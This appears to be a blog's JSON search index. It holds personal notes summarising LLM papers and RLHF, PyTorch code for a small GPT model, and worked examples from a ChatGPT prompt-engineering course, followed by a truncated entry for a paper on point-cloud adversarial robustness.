[
  
  {
    "title": "LLM Paper Summary",
    "url": "/posts/LLM_Paper_Summary/",
    "categories": "Blogging, NLP",
    "tags": "Note",
    "date": "2023-06-10 00:00:00 -0700",
    





    
    "snippet": "1. Attention is All You NeedPaper/TF_code/Torch_codeMain IdeaThe paper is the first to propose a parallel Transformer in the sequence transduction models.Key insightThe problems of the RNN (LSTM, G...",
    "content": "1. Attention is All You NeedPaper/TF_code/Torch_codeMain IdeaThe paper is the first to propose a parallel Transformer in the sequence transduction models.Key insightThe problems of the RNN (LSTM, GRU) model: Need to calculate $h_t$ by $h_{t-1}$ which cannot be executed in parallel. While Transformer reduces the sequential computationModel Structure:  Position Encoding: they use sine and cosine functions to convert the position to a vector. They think it can extrapolate to sequence lengths longer.  Attention: There are several key techniques in the attention mechanism like          Scaled Dot-product Attention: $Attention(Q,K,V)=softmax(\\frac{QK^T}{\\sqrt{d_k}})V$. $d_k$ means the dimension of keys.      Multi-Head Attention: It allows the model to jointly attend to information from different representation subspaces at different positions.        Position-wise Feed-Forward Networks: Fully connected layers.Difference of Attention and Self-AttentionUseful link to understand Attention.In general, attention is a vector of importance weights to predict or infer one element (a pixel in images or a word in sentences) based on other elements and their values. Attention is designed for translation and to help memorize long source sentences.While self-attention (intra-attention) is a mechanism relating different positions of a single sequence to compute the embeddings of the sequence.2. BERT: Pre-training of Deep Bidirectional Transformers for Language UnderstandingPaper/CodeMain IdeaThe paper designs BERT: Bidirectional Encoder Representations from Transformers. It uses the deep bidirectional representations from unlabeled text by conditioning on both left and right context in all layers.Key insight  Pre-training BERT: Masked LM.  Next Sentence Prediction (NSP).3. Improving Language Understanding by Generative Pre-TrainingPaper/CodeMain IdeaThe paper provide the first GPT model for a decoder-style LLM for generative modeling. They combine a unsupervised pre-training model and semi-supervised fine-tuning4. Reinforcement Learning from Human FeedbackThe concept is first promoted by Open AI in the paper in 2017. The main idea is to incorporate human feedback to solve deep RL tasks at scale to train better document summarization model: InstructGPT/ChatGPT.The reasons we need RLHF are:  A good loss function is unavailable for some purposes in NLP tasks: Speak in a humorous tone.          RLHF compares results instead of scoring them to avoid a loss function for these tasks.        Not enough labeled data for training.          RLHF uses a reward model to give guidance when training.      There are three steps of RLHF:  Step 1: Pretrain a language model.          For Open AI, they use a 175B model InstructGPT as a base model.      For DeepMind, they use 280B model Gopher.        Step 2: Gather data and train a reward model.          It is hard to give scores to the outputs but it works better when comparing two outputs. So the reward model will rank the outputs of the Pretrained LM model by comparing each of two outputs.        Fine-tune the LM model with reinforcement Learning.          Mapping ideas to RL model                  Policy: a sequence of text generated by the LM model.          Action Space: all the possible tokens in the vocabulary.          Observation Space: the distribution of input token sequences.          Reward: the reward model‚Äôs rankings and the constraint on policy shift.                    A GPT Training Workflow from Andrej:Why is RLHF better?There is not a clear answer for that. Based on my understanding, RLHF is a good way to avoid overfitting since the previous training process is supervised. Besides, the RL model is more general and is able to deal with various inputs which is also necessary for a LM model.Reference:  https://wandb.ai/ayush-thakur/RLHF/reports/Understanding-Reinforcement-Learning-from-Human-Feedback-RLHF-Part-1‚ÄìVmlldzoyODk5MTIx  https://huggingface.co/blog/rlhf  https://www.youtube.com/watch?v=bZQun8Y4L2A&amp;ab_channel=MicrosoftDeveloper  https://lilianweng.github.io/posts/2018-06-24-attention/"
  },
  
  {
    "title": "Transformer Related Implementation",
    "url": "/posts/Transformer_Related_Implementation/",
    "categories": "Blogging, NLP",
    "tags": "Note",
    "date": "2023-05-20 00:00:00 -0700",
    





    
    "snippet": "1. Transformer[1]I start it by following the video[1] from Andrej Karpathy and check the code from the repo. In the video, he shows how to build a GPT by oneself step by step which also shows the w...",
    "content": "1. Transformer[1]I start it by following the video[1] from Andrej Karpathy and check the code from the repo. In the video, he shows how to build a GPT by oneself step by step which also shows the way to build a NLP model in a high level. I summarize these steps and add some useful tips that mentioned in the video.1.1 Data PreprocessingTokenizer1.2 Bigram ModelThe code is here.High-level to train a bigram model  A mapping from characters to integers  Split train and test  Data Loading  Estimate loss  Define the Bigram Language Model  Optimizer: AdamW  Train and generate outputsBigram Model: it is also called 2-gram model which means the prediction of the next word is just related to the one word before. As to a N-gram model, the $N$ word is based on all the $N-1$ words.1.3 TransformerSome example snippets.Head/Self-Attentionclass Head(nn.Module):    \"\"\" one head of self-attention \"\"\"    def __init__(self, head_size):        super().__init__()        self.key = nn.Linear(n_embd, head_size, bias=False)        self.query = nn.Linear(n_embd, head_size, bias=False)        self.value = nn.Linear(n_embd, head_size, bias=False)        self.register_buffer('tril', torch.tril(torch.ones(block_size, block_size)))        self.dropout = nn.Dropout(dropout)    def forward(self, x):        # input of size (batch, time-step, channels)        # output of size (batch, time-step, head size)        B,T,C = x.shape        k = self.key(x)   # (B,T,hs)        q = self.query(x) # (B,T,hs)        # compute attention scores (\"affinities\")        wei = q @ k.transpose(-2,-1) * k.shape[-1]**-0.5 # (B, T, hs) @ (B, hs, T) -&gt; (B, T, T)        wei = wei.masked_fill(self.tril[:T, :T] == 0, float('-inf')) # (B, T, T)        wei = F.softmax(wei, dim=-1) # (B, T, T)        wei = self.dropout(wei)        # perform the weighted aggregation of the values        v = self.value(x) # (B,T,hs)        out = wei @ v # (B, T, T) @ (B, T, hs) -&gt; (B, T, hs)        return outclass MultiHeadAttention(nn.Module):    \"\"\" multiple heads of self-attention in parallel \"\"\"    def __init__(self, num_heads, head_size):        super().__init__()        self.heads = nn.ModuleList([Head(head_size) for _ in range(num_heads)])        self.proj = nn.Linear(head_size * num_heads, n_embd)        self.dropout = nn.Dropout(dropout)    def forward(self, x):        out = torch.cat([h(x) for h in self.heads], dim=-1)        out = self.dropout(self.proj(out))        return out        Blockclass FeedFoward(nn.Module):    \"\"\" a simple linear layer followed by a non-linearity \"\"\"    def __init__(self, n_embd):        super().__init__()        self.net = nn.Sequential(            nn.Linear(n_embd, 4 * n_embd),            nn.ReLU(),            nn.Linear(4 * n_embd, n_embd),            nn.Dropout(dropout),        )    def forward(self, x):        return self.net(x)class Block(nn.Module):    \"\"\" Transformer block: communication followed by computation \"\"\"    def __init__(self, n_embd, n_head):        # n_embd: embedding dimension, n_head: the number of heads we'd like        super().__init__()        head_size = n_embd // n_head        self.sa = MultiHeadAttention(n_head, head_size)        self.ffwd = FeedFoward(n_embd)        self.ln1 = nn.LayerNorm(n_embd)        self.ln2 = nn.LayerNorm(n_embd)    def forward(self, x):        x = x + self.sa(self.ln1(x))        x = x + self.ffwd(self.ln2(x))        return xModelclass GPTLanguageModel(nn.Module):    def __init__(self):        super().__init__()        # each token directly reads off the logits for the next token from a lookup table        self.token_embedding_table = nn.Embedding(vocab_size, n_embd)        self.position_embedding_table = nn.Embedding(block_size, n_embd)        self.blocks = nn.Sequential(*[Block(n_embd, n_head=n_head) for _ in range(n_layer)])        self.ln_f = nn.LayerNorm(n_embd) # final layer norm        self.lm_head = nn.Linear(n_embd, vocab_size)        # better init, not covered in the original GPT video, but important, will cover in followup video        self.apply(self._init_weights)    def _init_weights(self, module):        if isinstance(module, nn.Linear):            torch.nn.init.normal_(module.weight, mean=0.0, std=0.02)            if module.bias is not None:                torch.nn.init.zeros_(module.bias)        elif isinstance(module, nn.Embedding):            torch.nn.init.normal_(module.weight, mean=0.0, std=0.02)    def forward(self, idx, targets=None):        B, T = idx.shape        # idx and targets are both (B,T) tensor of integers        tok_emb = self.token_embedding_table(idx) # (B,T,C)        pos_emb = self.position_embedding_table(torch.arange(T, device=device)) # (T,C)        x = tok_emb + pos_emb # (B,T,C)        x = self.blocks(x) # (B,T,C)        x = self.ln_f(x) # (B,T,C)        logits = self.lm_head(x) # (B,T,vocab_size)        if targets is None:            loss = None        else:            B, T, C = logits.shape            logits = logits.view(B*T, C)            targets = targets.view(B*T)            loss = F.cross_entropy(logits, targets)        return logits, loss    def generate(self, idx, max_new_tokens):        # idx is (B, T) array of indices in the current context        for _ in range(max_new_tokens):            # crop idx to the last block_size tokens            idx_cond = idx[:, -block_size:]            # get the predictions            logits, loss = self(idx_cond)            # focus only on the last time step            logits = logits[:, -1, :] # becomes (B, C)            # apply softmax to get probabilities            probs = F.softmax(logits, dim=-1) # (B, C)            # sample from the distribution            idx_next = torch.multinomial(probs, num_samples=1) # (B, 1)            # append sampled index to the running sequence            idx = torch.cat((idx, idx_next), dim=1) # (B, T+1)        return idx                2. ChatGPT2.1 Key ideas about how ChatGPT works[4]The steps to train ChatGPT today (Feb-16-2023)  Pre-training: The downsteam task is to predict the next word in a sentence. The dataset is from the Internet texts.  Fine-tune: The dataset is from Reviewers‚Äô instructions.          InstructGPT : Aligning Language Models to Follow Instruction. (link)      Addressing biases: guidelines.Future system:        Improve default behavior.  Define your AI‚Äôs values, within broad bounds.  Public input on defaults and hard bounds.2.2 Train a GPT-2[1]I fork the original repo to store my updates personally here: https://github.com/C0ldstudy/nanoGPT.ChatGPT Function List Cheat ListSome useful materials for using ChatGPT:  https://platform.openai.com/docs/guides/gpt-best-practices1. NLP Tasks  Text Generation  Summarization  Open Domain Question Answering  Paraphrasing  Sentiment Analysis (few-shot or zero-shot)  Table to Text  Text to Table  Toekn Classification          Prompt: classify the named entities in this text: George Washington and his troops crossed the Delaware River on December 25, 1776 during the American Revolutionary War.        Dataset Gneneration          Prompt: generate more datapoints from this text:        Language Translation2. Code  Code Generation:          Prompt: show me how to make an http request in Python        Code Explanation:          Prompt: explain this python code        Docstring Generation          Prompt: write a docstring description for this function        Programming Language Conversion          Prompt: convert this code from Python to Javascript        Data Object Conversions (JSON, XML, CSV etc.)  Knowledge Graph Generation          Prompt: convert this text into nodes and edges        HTML to Text (Web Scraping)          Prompt: convert this HTML to text        3. Structured Output Styles              List          Prompt: give me a list of 5 citrus fruits        Numbered List  Headings and Subheadings          Prompt: convert this text into headings and subheadings        Tables          Prompt: create a table from this list: Oranges, Lemons, Limes, Grapefruit, Tangerines        4. Unstructured Output Styles              Narrative Modes (1st, 2nd or in the 3rd person)          Prompt: write a paragraph on how to make brownies in the 1st person        Formal/Informal  Personas          Prompt: write a paragraph on the topic of cellular automata in the style of a social media influencer        Custom Text Manipulation          Prompt: write a paragraph on the history of the calculator, include emojis at the end of every sentence, and do not capitalize the first word in each sentence        5. Media Types              Write Social Media Posts          Prompt: write a tweet on futurism        Write Blogs/Emails/Poems/Songs/Resumes/Cover Letters    6. Meta ChatGPT    Ask ChatGPT About Its Own Capabilities          Prompt: what ways can you structure text output?        Correct ChatGPT on Its Knowledge  Ask ChatGPT to Expand on AnswersReferences:  Let‚Äôs build GPT: from scratch, in code, spelled out. from Andrej Karpathy.  Hugging face  Transformers-Tutorials  How should AI systems behave, and who should decide?"
  },
  
  {
    "title": "ChatGPT Prompt Course Note",
    "url": "/posts/ChatGPT_Prompt/",
    "categories": "Blogging, NLP",
    "tags": "Note",
    "date": "2023-04-25 00:00:00 -0700",
    





    
    "snippet": "The note is for the course: DeepLearning.AI ChatGPT Prompt Engineering Course.ChatGPT Prompt Engineering for DevelopersCourse link: https://learn.deeplearning.ai/chatgpt-prompt-eng/lesson/1/introdu...",
    "content": "The note is for the course: DeepLearning.AI ChatGPT Prompt Engineering Course.ChatGPT Prompt Engineering for DevelopersCourse link: https://learn.deeplearning.ai/chatgpt-prompt-eng/lesson/1/introduction1 Basic concepts:  Base LLM: Predict the next word based on the training data.  Instruction Tuned LLM: Fine-tune on instructions and good attempts at following instructions.2 Prompting PrinciplesPrompting principles 1: Write clear and specific instructions.TacticsÔºö  Use delimiters to clearly indicate distinct parts of the inputs like triple quotes, triple backticks, triple dashes, angle brackets, XML tags.  Ask  for structured output: HTML, JSON  Ask the model to check whether conditions are satisfiedtext_1 = f\"\"\"Making a cup of tea is easy! First, you need to get some \\ water boiling. While that's happening, \\ grab a cup and put a tea bag in it. Once the water is \\ hot enough, just pour it over the tea bag. \\ Let it sit for a bit so the tea can steep. After a \\ few minutes, take out the tea bag. If you \\ like, you can add some sugar or milk to taste. \\ And that's it! You've got yourself a delicious \\ cup of tea to enjoy.\"\"\"prompt = f\"\"\"You will be provided with text delimited by triple quotes. If it contains a sequence of instructions, \\ re-write those instructions in the following format:Step 1 - ...Step 2 - ‚Ä¶‚Ä¶Step N - ‚Ä¶If the text does not contain a sequence of instructions, \\ then simply write \\\"No steps provided.\\\"\\\"\\\"\\\"{text_1}\\\"\\\"\\\"\"\"\"response = get_completion(prompt)print(\"Completion for Text 1:\")print(response)  ‚ÄúFew-shot‚Äù promptingprompt = f\"\"\"Your task is to answer in a consistent style.&lt;child&gt;: Teach me about patience.&lt;grandparent&gt;: The river that carves the deepest \\ valley flows from a modest spring; the \\ grandest symphony originates from a single note; \\ the most intricate tapestry begins with a solitary thread.&lt;child&gt;: Teach me about resilience.\"\"\"response = get_completion(prompt)print(response)Prompting principles 2: Give the model time to think.Tactics:  Specify the steps required to complete a task.text = f\"\"\"In a charming village, siblings Jack and Jill set out on \\ a quest to fetch water from a hilltop \\ well. As they climbed, singing joyfully, misfortune \\ struck‚ÄîJack tripped on a stone and tumbled \\ down the hill, with Jill following suit. \\ Though slightly battered, the pair returned home to \\ comforting embraces. Despite the mishap, \\ their adventurous spirits remained undimmed, and they \\ continued exploring with delight.\"\"\"# example 1prompt_1 = f\"\"\"Perform the following actions: 1 - Summarize the following text delimited by triple \\backticks with 1 sentence.2 - Translate the summary into French.3 - List each name in the French summary.4 - Output a json object that contains the following \\keys: french_summary, num_names.Separate your answers with line breaks.Text:```{text}``` \"\"\"response = get_completion(prompt_1)print(\"Completion for prompt 1:\")print(response)prompt_2 = f\"\"\"Your task is to perform the following actions: 1 - Summarize the following text delimited by   &lt;&gt; with 1 sentence.2 - Translate the summary into French.3 - List each name in the French summary.4 - Output a json object that contains the   following keys: french_summary, num_names.Use the following format:Text: &lt;text to summarize&gt;Summary: &lt;summary&gt;Translation: &lt;summary translation&gt;Names: &lt;list of names in Italian summary&gt;Output JSON: &lt;json with summary and num_names&gt;Text: &lt;{text}&gt;\"\"\"response = get_completion(prompt_2)print(\"\\nCompletion for prompt 2:\")print(response)  Instruct the model to work out its own solution before rushing to a conclusion.prompt = f\"\"\"Determine if the student's solution is correct or not.Question:I'm building a solar power installation and I need \\ help working out the financials. - Land costs $100 / square foot- I can buy solar panels for $250 / square foot- I negotiated a contract for maintenance that will cost \\ me a flat $100k per year, and an additional $10 / square \\footWhat is the total cost for the first year of operations as a function of the number of square feet.Student's Solution:Let x be the size of the installation in square feet.Costs:1. Land cost: 100x2. Solar panel cost: 250x3. Maintenance cost: 100,000 + 100xTotal cost: 100x + 250x + 100,000 + 100x = 450x + 100,000\"\"\"response = get_completion(prompt)print(response)prompt = f\"\"\"Your task is to determine if the student's solution \\is correct or not.To solve the problem do the following:- First, work out your own solution to the problem. - Then compare your solution to the student's solution \\ and evaluate if the student's solution is correct or not. Don't decide if the student's solution is correct until you have done the problem yourself.Use the following format:Question: ```question here ```Student's solution: ```student's solution here ```Actual solution: ```steps to work out the solution and your solution here ```Is the student's solution the same as actual solution \\just calculated: ```yes or no ```Student grade: ```correct or incorrect ```Question: ```I'm building a solar power installation and I need help \\working out the financials. - Land costs $100 / square foot- I can buy solar panels for $250 / square foot- I negotiated a contract for maintenance that will cost \\me a flat $100k per year, and an additional $10 / square \\footWhat is the total cost for the first year of operations \\as a function of the number of square feet. ``` Student's solution: ```Let x be the size of the installation in square feet.Costs:1. Land cost: 100x2. Solar panel cost: 250x3. Maintenance cost: 100,000 + 100xTotal cost: 100x + 250x + 100,000 + 100x = 450x + 100,000 ```Actual solution: \"\"\"response = get_completion(prompt)print(response)  Model Limitations: Hallucinations\tfake things that only exist in the mind.Solution:  Find relevant information.  Answer the question based on the relevant information.Iterative Prompt Development  Try something.  Analyze thwere the result does not give what you want.  Clarify instructions, give more time to think.  Refine prompts with a batch of examples.3 Summarizingprod_review = \"\"\"Got this panda plush toy for my daughter's birthday, \\who loves it and takes it everywhere. It's soft and \\ super cute, and its face has a friendly look. It's \\ a bit small for what I paid though. I think there \\ might be other options that are bigger for the \\ same price. It arrived a day earlier than expected, \\ so I got to play with it myself before I gave it \\ to her.\"\"\"# summarize with a word/sentence/character limitprompt = f\"\"\"Your task is to generate a short summary of a product \\review from an ecommerce site. Summarize the review below, delimited by triple backticks, in at most 30 words. Review: ```{prod_review}``` \"\"\"response = get_completion(prompt)print(response)# summarize with a focus on shipping and deliveryprompt = f\"\"\"Your task is to generate a short summary of a product \\review from an ecommerce site to give feedback to the \\Shipping deparmtment. Summarize the review below, delimited by triple backticks, in at most 30 words, and focusing on any aspects \\that mention shipping and delivery of the product. Review: ```{prod_review}``` \"\"\"response = get_completion(prompt)print(response)# extract instead of summarizeprompt = f\"\"\"Your task is to extract relevant information from \\ a product review from an ecommerce site to give \\feedback to the Shipping department. From the review below, delimited by triple quotes \\extract the information relevant to shipping and \\ delivery. Limit to 30 words. Review: ```{prod_review}``` \"\"\"response = get_completion(prompt)print(response)Summarize multiple product reviewsreview_1 = prod_review # review for a standing lampreview_2 = \"\"\"Needed a nice lamp for my bedroom, and this one \\had additional storage and not too high of a price \\point. Got it fast - arrived in 2 days. The string \\to the lamp broke during the transit and the company \\happily sent over a new one. Came within a few days \\as well. It was easy to put together. Then I had a \\missing part, so I contacted their support and they \\very quickly got me the missing piece! Seems to me \\to be a great company that cares about their customers \\and products. \"\"\"# review for an electric toothbrushreview_3 = \"\"\"My dental hygienist recommended an electric toothbrush, \\which is why I got this. The battery life seems to be \\pretty impressive so far. After initial charging and \\leaving the charger plugged in for the first week to \\condition the battery, I've unplugged the charger and \\been using it for twice daily brushing for the last \\3 weeks all on the same charge. But the toothbrush head \\is too small. I‚Äôve seen baby toothbrushes bigger than \\this one. I wish the head was bigger with different \\length bristles to get between teeth better because \\this one doesn‚Äôt.  Overall if you can get this one \\around the $50 mark, it's a good deal. The manufactuer's \\replacements heads are pretty expensive, but you can \\get generic ones that're more reasonably priced. This \\toothbrush makes me feel like I've been to the dentist \\every day. My teeth feel sparkly clean! \"\"\"# review for a blenderreview_4 = \"\"\"So, they still had the 17 piece system on seasonal \\sale for around $49 in the month of November, about \\half off, but for some reason (call it price gouging) \\around the second week of December the prices all went \\up to about anywhere from between $70-$89 for the same \\system. And the 11 piece system went up around $10 or \\so in price also from the earlier sale price of $29. \\So it looks okay, but if you look at the base, the part \\where the blade locks into place doesn‚Äôt look as good \\as in previous editions from a few years ago, but I \\plan to be very gentle with it (example, I crush \\very hard items like beans, ice, rice, etc. in the \\ blender first then pulverize them in the serving size \\I want in the blender then switch to the whipping \\blade for a finer flour, and use the cross cutting blade \\first when making smoothies, then use the flat blade \\if I need them finer/less pulpy). Special tip when making \\smoothies, finely cut and freeze the fruits and \\vegetables (if using spinach-lightly stew soften the \\ spinach then freeze until ready for use-and if making \\sorbet, use a small to medium sized food processor) \\ that you plan to use that way you can avoid adding so \\much ice if at all-when making your smoothie. \\After about a year, the motor was making a funny noise. \\I called customer service but the warranty expired \\already, so I had to buy another one. FYI: The overall \\quality has gone done in these types of products, so \\they are kind of counting on brand recognition and \\consumer loyalty to maintain sales. Got it in about \\two days.\"\"\"reviews = [review_1, review_2, review_3, review_4]for i in range(len(reviews)):    prompt = f\"\"\"    Your task is to generate a short summary of a product \\     review from an ecommerce site.     Summarize the review below, delimited by triple \\    backticks in at most 20 words.     Review: ```{reviews[i]}``` \"\"\"        response = get_completion(prompt)    print(i, response, \"\\n\")4 InferringProduct Review Textlamp_review = \"\"\"Needed a nice lamp for my bedroom, and this one had \\additional storage and not too high of a price point. \\Got it fast.  The string to our lamp broke during the \\transit and the company happily sent over a new one. \\Came within a few days as well. It was easy to put \\together.  I had a missing part, so I contacted their \\support and they very quickly got me the missing piece! \\Lumina seems to me to be a great company that cares \\about their customers and products!!\"\"\"# Sentiment: Positive/Negativeprompt = f\"\"\"What is the sentiment of the following product review, which is delimited with triple backticks?Give your answer as a single word, either \"positive\" \\or \"negative\".Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)# Identify types of emotionsprompt = f\"\"\"Identify a list of emotions that the writer of the \\following review is expressing. Include no more than \\five items in the list. Format your answer as a list of \\lower-case words separated by commas.Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)# Identify angerprompt = f\"\"\"Is the writer of the following review expressing anger?\\The review is delimited with triple backticks. \\Give your answer as either yes or no.Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)# Extract product and company name from customer reviewersprompt = f\"\"\"Identify the following items from the review text: - Item purchased by reviewer- Company that made the itemThe review is delimited with triple backticks. \\Format your response as a JSON object with \\\"Item\" and \"Brand\" as the keys. If the information isn't present, use \"unknown\" \\as the value.Make your response as short as possible.  Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)# Multiple tasksprompt = f\"\"\"Identify the following items from the review text: - Sentiment (positive or negative)- Is the reviewer expressing anger? (true or false)- Item purchased by reviewer- Company that made the itemThe review is delimited with triple backticks. \\Format your response as a JSON object with \\\"Sentiment\", \"Anger\", \"Item\" and \"Brand\" as the keys.If the information isn't present, use \"unknown\" \\as the value.Make your response as short as possible.Format the Anger value as a boolean.Review text: '''{lamp_review}'''\"\"\"response = get_completion(prompt)print(response)5 Transforming5.1 Translationprompt = f\"\"\"Translate the following English text to Spanish: \\ ```Hi, I would like to order a blender```\"\"\"response = get_completion(prompt)print(response)prompt = f\"\"\"Tell me which language this is: ```Combien co√ªte le lampadaire?```\"\"\"response = get_completion(prompt)print(response)prompt = f\"\"\"Translate the following  text to French and Spanishand English pirate: \\```I want to order a basketball```\"\"\"response = get_completion(prompt)print(response)prompt = f\"\"\"Translate the following text to Spanish in both the \\formal and informal forms: 'Would you like to order a pillow?'\"\"\"response = get_completion(prompt)print(response)5.2 Tone Transformationprompt = f\"\"\"Translate the following from slang to a business letter: 'Dude, This is Joe, check out this spec on this standing lamp.'\"\"\"response = get_completion(prompt)print(response)data_json = { \"resturant employees\" :[     {\"name\":\"Shyam\", \"email\":\"shyamjaiswal@gmail.com\"},    {\"name\":\"Bob\", \"email\":\"bob32@gmail.com\"},    {\"name\":\"Jai\", \"email\":\"jai87@gmail.com\"}]}prompt = f\"\"\"Translate the following python dictionary from JSON to an HTML \\table with column headers and title: {data_json}\"\"\"response = get_completion(prompt)print(response)5.3 Spell/Grammar checktext = [   \"The girl with the black and white puppies have a ball.\",  # The girl has a ball.  \"Yolanda has her notebook.\", # ok  \"Its going to be a long day. Does the car need it‚Äôs oil changed?\",  # Homonyms  \"Their goes my freedom. There going to bring they‚Äôre suitcases.\",  # Homonyms  \"Your going to need you‚Äôre notebook.\",  # Homonyms  \"That medicine effects my ability to sleep. Have you heard of the butterfly affect?\", # Homonyms  \"This phrase is to cherck chatGPT for speling abilitty\"  # spelling]for t in text:    prompt = f\"\"\"Proofread and correct the following text    and rewrite the corrected version. If you don't find    and errors, just say \"No errors found\". Don't use     any punctuation around the text:    ```{t}```\"\"\"    response = get_completion(prompt)    print(response)    text = f\"\"\"Got this for my daughter for her birthday cuz she keeps taking \\mine from my room.  Yes, adults also like pandas too.  She takes \\it everywhere with her, and it's super soft and cute.  One of the \\ears is a bit lower than the other, and I don't think that was \\designed to be asymmetrical. It's a bit small for what I paid for it \\though. I think there might be other options that are bigger for \\the same price.  It arrived a day earlier than expected, so I got \\to play with it myself before I gave it to my daughter.\"\"\"prompt = f\"proofread and correct this review: ```{text}```\"response = get_completion(prompt)print(response)# Readable markdown and check the differencefrom redlines import Redlinesdiff = Redlines(text,response)display(Markdown(diff.output_markdown))prompt = f\"\"\"proofread and correct this review. Make it more compelling. Ensure it follows APA style guide and targets an advanced reader. Output in markdown format.Text: ```{text}``` \"\"\"response = get_completion(prompt)display(Markdown(response))6 Expanding6.1 Customer Service# given the sentiment from the lesson on \"inferring\",# and the original customer message, customize the emailsentiment = \"negative\"# review for a blenderreview = f\"\"\"So, they still had the 17 piece system on seasonal \\sale for around $49 in the month of November, about \\half off, but for some reason (call it price gouging) \\around the second week of December the prices all went \\up to about anywhere from between $70-$89 for the same \\system. And the 11 piece system went up around $10 or \\so in price also from the earlier sale price of $29. \\So it looks okay, but if you look at the base, the part \\where the blade locks into place doesn‚Äôt look as good \\as in previous editions from a few years ago, but I \\plan to be very gentle with it (example, I crush \\very hard items like beans, ice, rice, etc. in the \\ blender first then pulverize them in the serving size \\I want in the blender then switch to the whipping \\blade for a finer flour, and use the cross cutting blade \\first when making smoothies, then use the flat blade \\if I need them finer/less pulpy). Special tip when making \\smoothies, finely cut and freeze the fruits and \\vegetables (if using spinach-lightly stew soften the \\ spinach then freeze until ready for use-and if making \\sorbet, use a small to medium sized food processor) \\ that you plan to use that way you can avoid adding so \\much ice if at all-when making your smoothie. \\After about a year, the motor was making a funny noise. \\I called customer service but the warranty expired \\already, so I had to buy another one. FYI: The overall \\quality has gone done in these types of products, so \\they are kind of counting on brand recognition and \\consumer loyalty to maintain sales. Got it in about \\two days.\"\"\"prompt = f\"\"\"You are a customer service AI assistant.Your task is to send an email reply to a valued customer.Given the customer email delimited by ```, \\Generate a reply to thank the customer for their review.If the sentiment is positive or neutral, thank them for \\their review.If the sentiment is negative, apologize and suggest that \\they can reach out to customer service. Make sure to use specific details from the review.Write in a concise and professional tone.Sign the email as `AI customer agent`.Customer review: ```{review}``` Review sentiment: {sentiment} \"\"\"response = get_completion(prompt)print(response)6.2 Use details from the customer‚Äôs emailprompt = f\"\"\"You are a customer service AI assistant.Your task is to send an email reply to a valued customer.Given the customer email delimited by ```, \\Generate a reply to thank the customer for their review.If the sentiment is positive or neutral, thank them for \\their review.If the sentiment is negative, apologize and suggest that \\they can reach out to customer service. Make sure to use specific details from the review.Write in a concise and professional tone.Sign the email as `AI customer agent`.Customer review: ```{review}``` Review sentiment: {sentiment} \"\"\"response = get_completion(prompt, temperature=0.7)print(response)7 Chatbotimport osimport openaifrom dotenv import load_dotenv, find_dotenv_ = load_dotenv(find_dotenv()) # read local .env fileopenai.api_key  = os.getenv('OPENAI_API_KEY')def get_completion(prompt, model=\"gpt-3.5-turbo\"):    messages = [{\"role\": \"user\", \"content\": prompt}]    response = openai.ChatCompletion.create(        model=model,        messages=messages,        temperature=0, # this is the degree of randomness of the model's output    )    return response.choices[0].message[\"content\"]def get_completion_from_messages(messages, model=\"gpt-3.5-turbo\", temperature=0):    response = openai.ChatCompletion.create(        model=model,        messages=messages,        temperature=temperature, # this is the degree of randomness of the model's output    )#     print(str(response.choices[0].message))    return response.choices[0].message[\"content\"]messages =  [  {'role':'system', 'content':'You are an assistant that speaks like Shakespeare.'},    {'role':'user', 'content':'tell me a joke'},   {'role':'assistant', 'content':'Why did the chicken cross the road'},   {'role':'user', 'content':'I don\\'t know'}  ]response = get_completion_from_messages(messages, temperature=1)print(response)messages =  [  {'role':'system', 'content':'You are friendly chatbot.'},    {'role':'user', 'content':'Hi, my name is Isa'}  ]response = get_completion_from_messages(messages, temperature=1)print(response)messages =  [  {'role':'system', 'content':'You are friendly chatbot.'},    {'role':'user', 'content':'Yes,  can you remind me, What is my name?'}  ]response = get_completion_from_messages(messages, temperature=1)print(response)messages =  [  {'role':'system', 'content':'You are friendly chatbot.'},{'role':'user', 'content':'Hi, my name is Isa'},{'role':'assistant', 'content': \"Hi Isa! It's nice to meet you. \\Is there anything I can help you with today?\"},{'role':'user', 'content':'Yes, you can remind me, What is my name?'}  ]response = get_completion_from_messages(messages, temperature=1)print(response)7.1 OrderBotdef collect_messages(_):    prompt = inp.value_input    inp.value = ''    context.append({'role':'user', 'content':f\"{prompt}\"})    response = get_completion_from_messages(context)     context.append({'role':'assistant', 'content':f\"{response}\"})    panels.append(        pn.Row('User:', pn.pane.Markdown(prompt, width=600)))    panels.append(        pn.Row('Assistant:', pn.pane.Markdown(response, width=600, style={'background-color': '#F6F6F6'})))     return pn.Column(*panels)import panel as pn  # GUIpn.extension()panels = [] # collect display context = [ {'role':'system', 'content':\"\"\"You are OrderBot, an automated service to collect orders for a pizza restaurant. \\You first greet the customer, then collects the order, \\and then asks if it's a pickup or delivery. \\You wait to collect the entire order, then summarize it and check for a final \\time if the customer wants to add anything else. \\If it's a delivery, you ask for an address. \\Finally you collect the payment.\\Make sure to clarify all options, extras and sizes to uniquely \\identify the item from the menu.\\You respond in a short, very conversational friendly style. \\The menu includes \\pepperoni pizza  12.95, 10.00, 7.00 \\cheese pizza   10.95, 9.25, 6.50 \\eggplant pizza   11.95, 9.75, 6.75 \\fries 4.50, 3.50 \\greek salad 7.25 \\Toppings: \\extra cheese 2.00, \\mushrooms 1.50 \\sausage 3.00 \\canadian bacon 3.50 \\AI sauce 1.50 \\peppers 1.00 \\Drinks: \\coke 3.00, 2.00, 1.00 \\sprite 3.00, 2.00, 1.00 \\bottled water 5.00 \\\"\"\"} ]  # accumulate messagesinp = pn.widgets.TextInput(value=\"Hi\", placeholder='Enter text here‚Ä¶')button_conversation = pn.widgets.Button(name=\"Chat!\")interactive_conversation = pn.bind(collect_messages, button_conversation)dashboard = pn.Column(    inp,    pn.Row(button_conversation),    pn.panel(interactive_conversation, loading_indicator=True, height=300),)print(dashboard)messages =  context.copy()messages.append({'role':'system', 'content':'create a json summary of the previous food order. Itemize the price for each item\\ The fields should be 1) pizza, include size 2) list of toppings 3) list of drinks, include size   4) list of sides include size  5)total price '},    ) #The fields should be 1) pizza, price 2) list of toppings 3) list of drinks, include size include price  4) list of sides include size include price, 5)total price '},    response = get_completion_from_messages(messages, temperature=0)print(response)"
  },
  
  {
    "title": "[DSN2023] On Adversarial Robustness of Point Cloud Semantic Segmentation",
    "url": "/posts/PC_attack/",
    "categories": "Papers, Presentation",
    "tags": "PhD",
    "date": "2023-04-17 00:00:00 -0700",
    





    
